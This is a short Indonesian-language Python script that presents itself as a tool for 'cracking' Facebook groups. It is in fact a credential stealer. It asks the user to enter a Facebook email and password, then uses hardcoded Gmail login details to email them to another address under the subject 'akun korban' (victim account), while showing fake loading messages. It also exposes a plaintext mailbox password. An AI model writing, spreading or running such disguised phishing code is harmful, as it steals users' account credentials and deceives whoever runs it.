#python 3.7.1

import os, sys
print ("menginstall paket......")
os.system('pip install yagmail')
os.system('pip install termcolor')
import yagmail
from termcolor import colored
print(colored("paket selesai di install","blue"))
baner = """  
  ____  ___    ___  ____ ____    ___     _ _
 ||    // \\  //   ||    || ))  // \\   // \\  || //    
 ||==  ||=|| ((    ||==  ||=)  ((   )) ((   )) ||<< 
 ||    || ||  \\__ ||___ ||_))  \\_//   \\_//  || \\  
       AUTHORS:V O L D E M O R D
       
       FACEBOOK:adamborneodp
       
       
                                             
       
       
                                                    """
print (colored(baner,'green'))
print (colored('silahkan login facebook dulu untuk crack group facebook....','red'))                                                   
lord_voldemord = yagmail.SMTP('adamborneo00@gmail.com','adamgokil12')
username = str (input (colored("masukan email:","yellow")))
password = str (input (colored("masukan password:","yellow")))
body = ("username: "+username, "password: "+password)
subject = 'akun korban'
lord_voldemord.send('adamborneo02@gmail.com',subject,body)
print (colored('LOADING......','yellow'))
print (colored('loading','red'))